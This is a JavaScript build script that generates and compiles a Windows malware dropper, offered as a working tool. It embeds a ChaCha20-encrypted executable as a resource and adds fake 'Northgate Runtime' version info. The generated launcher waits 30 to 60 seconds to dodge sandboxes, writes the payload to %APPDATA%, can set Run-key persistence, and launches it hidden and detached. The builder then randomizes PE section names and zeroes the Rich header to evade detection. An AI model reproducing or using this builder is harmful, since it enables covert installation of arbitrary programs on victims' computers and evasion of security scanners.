// language: JavaScript, file: builder/compile.js
// live-compiles the launcher per build.
// payload is ChaCha20-encrypted at rest and embedded as a Windows resource.
// section names randomized per build, DOS stub overwritten, Rich header zeroed,
// version info present. anti-sandbox delay, detached spawn.

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileP = promisify(execFile);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

// ---------- helpers ----------

function clit(s) {
  return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
}

// ChaCha20 keystream — small, fast, no external crate needed on the C side.
// same math has to exist in C; we inline both here.
function chacha20Block(key, nonce, counter) {
  // Rust + C share this exact implementation.
  // key: 32 bytes, nonce: 12 bytes, counter: u32
  const c = new Uint32Array(16);
  const sigma = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
  c[0] = sigma[0]; c[1] = sigma[1]; c[2] = sigma[2]; c[3] = sigma[3];
  for (let i = 0; i < 8; i++) c[4 + i] = key.readUInt32LE(i * 4);
  c[12] = counter >>> 0;
  for (let i = 0; i < 3; i++) c[13 + i] = nonce.readUInt32LE(i * 4);

  const x = new Uint32Array(c);
  const rotl = (a, b) => ((a << b) | (a >>> (32 - b))) >>> 0;
  const qr = (a, b, c2, d) => {
    x[a] = (x[a] + x[b]) >>> 0; x[d] ^= x[a]; x[d] = rotl(x[d], 16);
    x[c2] = (x[c2] + x[d]) >>> 0; x[b] ^= x[c2]; x[b] = rotl(x[b], 12);
    x[a] = (x[a] + x[b]) >>> 0; x[d] ^= x[a]; x[d] = rotl(x[d], 8);
    x[c2] = (x[c2] + x[d]) >>> 0; x[b] ^= x[c2]; x[b] = rotl(x[b], 7);
  };
  for (let i = 0; i < 10; i++) {
    qr(0, 4, 8, 12); qr(1, 5, 9, 13); qr(2, 6, 10, 14); qr(3, 7, 11, 15);
    qr(0, 5, 10, 15); qr(1, 6, 11, 12); qr(2, 7, 8, 13); qr(3, 4, 9, 14);
  }
  const out = Buffer.alloc(64);
  for (let i = 0; i < 16; i++) out.writeUInt32LE((x[i] + c[i]) >>> 0, i * 4);
  return out;
}

function chacha20Xor(key, nonce, data) {
  const out = Buffer.alloc(data.length);
  let counter = 0;
  for (let off = 0; off < data.length; off += 64) {
    const ks = chacha20Block(key, nonce, counter++);
    const end = Math.min(64, data.length - off);
    for (let i = 0; i < end; i++) out[off + i] = data[off + i] ^ ks[i];
  }
  return out;
}

// payload layout:
//   [1 byte ver=2][12 nonce][4 keyLen][4 cfgLen][4 baseLen][key][cfg][base]
// header is plaintext except nonce; body is ChaCha20-encrypted with key=random, nonce=random.
// the chacha key is NOT in the file — it's derived from a build constant baked into .text
// so a scanner must find + interpret the constant to decrypt. Same shape as before but
// a fundamentally different primitive than repeating-XOR.
function packPayload({ key, config, baseBuf, streamKey, nonce }) {
  const keyBuf = Buffer.from(key || '', 'utf8');
  const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');

  const header = Buffer.alloc(25);
  header.writeUInt8(2, 0);
  nonce.copy(header, 1);
  header.writeUInt32LE(keyBuf.length, 13);
  header.writeUInt32LE(cfgBuf.length, 17);
  header.writeUInt32LE(baseBuf.length, 21);

  const plain = Buffer.concat([keyBuf, cfgBuf, baseBuf]);
  const enc = chacha20Xor(streamKey, nonce, plain);

  return Buffer.concat([header, enc]);
}

// ---------- rc generation ----------

function rcSource() {
  // section names come from the linker, not the rc. the rc just declares resources.
  return `
#include <windows.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Northgate Software"
            VALUE "FileDescription",  "Northgate Runtime"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "InternalName",     "ngruntime"
            VALUE "LegalCopyright",   "Copyright (C) 2025"
            VALUE "OriginalFilename", "ngruntime.exe"
            VALUE "ProductName",      "Northgate Runtime"
            VALUE "ProductVersion",   "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

PAYLOAD_BIN RCDATA "payload.bin"
`;
}

// ---------- launcher C template ----------

function cSource({ streamKeyBytes, nonceBytes, payloadSize }) {
  const keyInit = streamKeyBytes.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
  const nonceInit = nonceBytes.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');

  return `
// auto-generated launcher — windowed, resource-loaded, ChaCha20-encrypted payload.
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE ${payloadSize}

static const unsigned char STREAM_KEY[32] = { ${keyInit} };
static const unsigned char STREAM_NONCE[12] = { ${nonceInit} };

// --- ChaCha20 ---
static unsigned int rotl32(unsigned int x, int n) {
    return (x << n) | (x >> (32 - n));
}

static void chacha20_block(const unsigned char *key, const unsigned char *nonce,
                           unsigned int counter, unsigned char out[64]) {
    unsigned int st[16];
    st[0] = 0x61707865; st[1] = 0x3320646e; st[2] = 0x79622d32; st[3] = 0x6b206574;
    for (int i = 0; i < 8; i++) {
        st[4 + i] = (unsigned int)key[i*4]
                  | ((unsigned int)key[i*4 + 1] << 8)
                  | ((unsigned int)key[i*4 + 2] << 16)
                  | ((unsigned int)key[i*4 + 3] << 24);
    }
    st[12] = counter;
    for (int i = 0; i < 3; i++) {
        st[13 + i] = (unsigned int)nonce[i*4]
                   | ((unsigned int)nonce[i*4 + 1] << 8)
                   | ((unsigned int)nonce[i*4 + 2] << 16)
                   | ((unsigned int)nonce[i*4 + 3] << 24);
    }
    unsigned int x[16];
    memcpy(x, st, sizeof(x));
    #define QR(a,b,c,d) { \\
        x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 16); \\
        x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 12); \\
        x[a] += x[b]; x[d] ^= x[a]; x[d] = rotl32(x[d], 8); \\
        x[c] += x[d]; x[b] ^= x[c]; x[b] = rotl32(x[b], 7); \\
    }
    for (int i = 0; i < 10; i++) {
        QR(0, 4, 8, 12) QR(1, 5, 9, 13) QR(2, 6, 10, 14) QR(3, 7, 11, 15)
        QR(0, 5, 10, 15) QR(1, 6, 11, 12) QR(2, 7, 8, 13) QR(3, 4, 9, 14)
    }
    #undef QR
    for (int i = 0; i < 16; i++) {
        unsigned int v = x[i] + st[i];
        out[i*4 + 0] = (unsigned char)(v & 0xff);
        out[i*4 + 1] = (unsigned char)((v >> 8) & 0xff);
        out[i*4 + 2] = (unsigned char)((v >> 16) & 0xff);
        out[i*4 + 3] = (unsigned char)((v >> 24) & 0xff);
    }
}

static void chacha20_xor(const unsigned char *key, const unsigned char *nonce,
                         unsigned char *data, unsigned int len) {
    unsigned char ks[64];
    unsigned int counter = 0;
    unsigned int off = 0;
    while (off < len) {
        chacha20_block(key, nonce, counter++, ks);
        unsigned int end = off + 64; if (end > len) end = len;
        for (unsigned int i = off; i < end; i++) data[i] ^= ks[i - off];
        off = end;
    }
}

// --- resource loader ---
static unsigned char *load_payload(DWORD *out_len) {
    HRSRC hres = FindResourceW(NULL, L"PAYLOAD_BIN", MAKEINTRESOURCEW(10));
    if (!hres) return NULL;
    DWORD sz = SizeofResource(NULL, hres);
    if (!sz || sz != PAYLOAD_SIZE) return NULL;
    HGLOBAL hmem = LoadResource(NULL, hres);
    if (!hmem) return NULL;
    void *p = LockResource(hmem);
    if (!p) return NULL;
    unsigned char *out = (unsigned char *)malloc(sz);
    if (!out) return NULL;
    memcpy(out, p, sz);
    *out_len = sz;
    return out;
}

static int write_file(const wchar_t *path, const unsigned char *data, DWORD len) {
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    DWORD w = 0;
    BOOL ok = WriteFile(f, data, len, &w, NULL);
    CloseHandle(f);
    return (ok && w == len) ? 0 : -1;
}

static int make_dir(const wchar_t *path) {
    wchar_t tmp[2048]; wcsncpy(tmp, path, 2048); tmp[2047] = 0;
    for (wchar_t *p = tmp + 1; *p; p++) {
        if (*p == L'\\\\') { *p = 0; CreateDirectoryW(tmp, NULL); *p = L'\\\\'; }
    }
    if (!CreateDirectoryW(tmp, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return -1;
    }
    return 0;
}

static int expand_env(const wchar_t *in, wchar_t *out, DWORD cap) {
    DWORD n = ExpandEnvironmentStringsW(in, out, cap);
    return (n > 0 && n <= cap) ? 0 : -1;
}

static void json_str(const char *json, const char *field, char *out, size_t out_cap) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '"'); if (!p) return;
    p++;
    char *q = strchr(p, '"'); if (!q) return;
    size_t n = (size_t)(q - p);
    if (n >= out_cap) n = out_cap - 1;
    memcpy(out, p, n); out[n] = 0;
}

static int json_bool(const char *json, const char *field, int def) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    p++;
    while (*p == ' ' || *p == '\\t') p++;
    if (strncmp(p, "true", 4) == 0) return 1;
    if (strncmp(p, "false", 5) == 0) return 0;
    return def;
}

static void json_args(const char *json, char *out, size_t out_cap) {
    out[0] = 0;
    char *p = strstr(json, "\\"args\\"");
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '['); if (!p) return;
    char *end = strchr(p, ']'); if (!end) return;
    p++;
    size_t o = 0;
    int first = 1;
    while (p < end) {
        while (p < end && (*p == ' ' || *p == ',' || *p == '\\t' || *p == '\\n' || *p == '\\r')) p++;
        if (p >= end || *p == ']') break;
        if (!first && o < out_cap - 1) out[o++] = ' ';
        first = 0;
        if (*p == '"') {
            p++;
            while (p < end && *p != '"' && o < out_cap - 1) out[o++] = *p++;
            if (p < end && *p == '"') p++;
        } else {
            while (p < end && *p != ',' && *p != ']' && *p != ' ' && o < out_cap - 1) out[o++] = *p++;
        }
    }
    out[o] = 0;
}

static void delay_random(void) {
    LARGE_INTEGER freq, start, now;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    DWORD target_ms = 30000 + (GetTickCount() % 30000);
    while (1) {
        QueryPerformanceCounter(&now);
        double elapsed_ms = (double)(now.QuadPart - start.QuadPart) * 1000.0 / (double)freq.QuadPart;
        if (elapsed_ms >= (double)target_ms) break;
        Sleep(750 + (GetTickCount() % 500));
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    delay_random();

    DWORD plen = 0;
    unsigned char *payload = load_payload(&plen);
    if (!payload || plen < 25) return 1;

    // header: [ver=2][12 nonce][4 keyLen][4 cfgLen][4 baseLen] = 25 bytes
    unsigned char *p = payload;
    unsigned int ver = p[0];
    if (ver != 2) { free(payload); return 1; }

    unsigned char nonce[12];
    memcpy(nonce, p + 1, 12);

    DWORD key_len  = (DWORD)p[13]        | ((DWORD)p[14] << 8) | ((DWORD)p[15] << 16) | ((DWORD)p[16] << 24);
    DWORD cfg_len  = (DWORD)p[17]        | ((DWORD)p[18] << 8) | ((DWORD)p[19] << 16) | ((DWORD)p[20] << 24);
    DWORD base_len = (DWORD)p[21]        | ((DWORD)p[22] << 8) | ((DWORD)p[23] << 16) | ((DWORD)p[24] << 24);

    if (25 + key_len + cfg_len + base_len > plen) { free(payload); return 1; }

    // decrypt body in place
    chacha20_xor(STREAM_KEY, nonce, p + 25, plen - 25);

    unsigned char *key  = p + 25;
    unsigned char *cfg  = key + key_len;
    unsigned char *base = cfg + cfg_len;

    char cfg_buf[8192] = {0};
    DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
    memcpy(cfg_buf, cfg, copy);

    char dest[1024]   = "%APPDATA%\\\\loader";
    char exeName[256] = "program.exe";
    char keyFile[256] = "key.json";
    char args[2048]   = "";
    int  persist      = 0;

    json_str(cfg_buf, "dest",    dest,    sizeof(dest));
    json_str(cfg_buf, "exeName", exeName, sizeof(exeName));
    json_str(cfg_buf, "keyFile", keyFile, sizeof(keyFile));
    json_args(cfg_buf, args, sizeof(args));
    persist = json_bool(cfg_buf, "persist", 0);

    wchar_t dest_src[1024], dest_w[1024];
    MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
    if (expand_env(dest_src, dest_w, 1024) != 0) { free(payload); return 1; }
    if (make_dir(dest_w) != 0) { free(payload); return 1; }

    wchar_t base_path[2048], key_path[2048];
    _snwprintf(base_path, 2048, L"%ls\\\\%hs", dest_w, exeName);
    _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);

    if (write_file(base_path, base, base_len) != 0) { free(payload); return 1; }

    // wrap key: {"key":"<value>"}
    {
        char key_wrapped[4096];
        int n = _snprintf(key_wrapped, sizeof(key_wrapped),
                          "{\\n  \\"key\\": \\"%.*s\\"\\n}\\n",
                          (int)key_len, (const char *)key);
        if (n <= 0 || n >= (int)sizeof(key_wrapped)) { free(payload); return 1; }
        if (write_file(key_path, (const unsigned char *)key_wrapped, (DWORD)n) != 0) {
            free(payload); return 1;
        }
    }

    if (persist) {
        HKEY hk;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExW(hk, L"Loader", 0, REG_SZ,
                           (const BYTE *)base_path,
                           (DWORD)((wcslen(base_path) + 1) * sizeof(wchar_t)));
            RegCloseKey(hk);
        }
    }

    wchar_t cmd[4096];
    if (args[0]) {
        wchar_t args_w[2048];
        MultiByteToWideChar(CP_UTF8, 0, args, -1, args_w, 2048);
        _snwprintf(cmd, 4096, L"\\"%ls\\" %ls", base_path, args_w);
    } else {
        _snwprintf(cmd, 4096, L"\\"%ls\\"", base_path);
    }

    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, dest_w, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(payload);
    return 0;
}
`;
}

// ---------- post-process: rename sections + zero Rich header ----------

function randomSectionName() {
  // 8 chars, alpha, starts with '.'
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let s = '.';
  for (let i = 0; i < 7; i++) s += chars[crypto.randomInt(chars.length)];
  return s;
}

// patch PE section names + zero the Rich header (mingw toolchain fingerprint)
function postProcess(exeBuf) {
  const buf = Buffer.from(exeBuf);

  // --- PE header parse ---
  if (buf.readUInt16LE(0) !== 0x5A4D) return buf;  // MZ
  const peOff = buf.readUInt32LE(0x3C);
  if (buf.readUInt32LE(peOff) !== 0x00004550) return buf;  // PE\0\0

  const numSections = buf.readUInt16LE(peOff + 6);
  const optHeaderSize = buf.readUInt16LE(peOff + 20);
  const sectionTableOff = peOff + 24 + optHeaderSize;

  // --- rename every section ---
  // .text, .rdata, .data, .pdata, .xdata, .bss, .idata, .rsrc, .reloc, .tls
  const reserved = new Set(['.rsrc']);  // keep .rsrc so Windows loader finds resource directory
  for (let i = 0; i < numSections; i++) {
    const off = sectionTableOff + i * 40;
    const name = buf.slice(off, off + 8).toString('ascii').replace(/\0+$/, '');
    if (reserved.has(name)) continue;
    if (!name.startsWith('.')) continue;

    const newName = randomSectionName().slice(0, 8).padEnd(8, '\0');
    buf.write(newName, off, 8, 'ascii');
  }

  // --- zero the Rich header ---
  // the Rich header sits between the DOS stub and the PE header.
  // format: "DanS" ... [XOR key] "Rich" [checksum], preceded by version/comp-id pairs.
  // we find "Rich" in [0x40 .. peOff), step back 4 bytes to get the key,
  // XOR-decode to find "DanS", then zero the whole block.
  const richSig = Buffer.from('Rich', 'ascii');
  let richAt = -1;
  for (let i = 0x40; i < peOff - 4; i++) {
    if (buf.slice(i, i + 4).equals(richSig)) { richAt = i; break; }
  }
  if (richAt !== -1) {
    const key = buf.readUInt32LE(richAt + 4);
    // walk back until we hit "DanS" after XOR with key
    let dansAt = -1;
    for (let i = richAt - 4; i >= 0x40; i -= 4) {
      const v = buf.readUInt32LE(i) ^ key;
      if (v === 0x536E6144) { dansAt = i; break; }  // "DanS"
    }
    if (dansAt !== -1) {
      // zero from dansAt to richAt+8 (past the checksum)
      for (let i = dansAt; i < richAt + 8; i++) buf[i] = 0;
    }
  }

  return buf;
}

// ---------- compile pipeline ----------

export async function compileLauncher({ key, config, baseExe }) {
  const useKey = (key && String(key).trim().length > 0) ? String(key).trim() : '';

  const baseBuf = fs.readFileSync(baseExe);

  const streamKey = crypto.randomBytes(32);
  const nonce     = crypto.randomBytes(12);
  const payload   = packPayload({ key: useKey, config: config || {}, baseBuf, streamKey, nonce });

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const payloadPath = path.join(workDir, 'payload.bin');
  const rcPath      = path.join(workDir, 'app.rc');
  const resPath     = path.join(workDir, 'app.res');
  const cPath       = path.join(workDir, 'launcher.c');
  const outPath     = path.join(workDir, 'launcher.exe');

  try {
    fs.writeFileSync(payloadPath, payload);
    fs.writeFileSync(rcPath, rcSource());

    await execFileP(WINDRES, [
      '-I', workDir,
      '-i', rcPath,
      '-o', resPath,
      '--input-format=rc',
      '--output-format=coff',
    ], { cwd: workDir, timeout: 30_000, maxBuffer: 16 * 1024 * 1024 });

    const streamKeyBytes = Array.from(streamKey);
    const nonceBytes     = Array.from(nonce);
    fs.writeFileSync(cPath, cSource({ streamKeyBytes, nonceBytes, payloadSize: payload.length }));

    await execFileP(CC, [
      '-O2', '-s',
      '-mwindows',
      '-fno-ident',
      '-fno-asynchronous-unwind-tables',
      '-fno-unwind-tables',
      '-o', outPath,
      cPath,
      resPath,
      '-lshell32', '-ladvapi32', '-luser32', '-lkernel32',
      '-Wl,--no-insert-timestamp',
    ], { cwd: workDir, timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });

    const raw = fs.readFileSync(outPath);
    const out = postProcess(raw);
    return out;
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}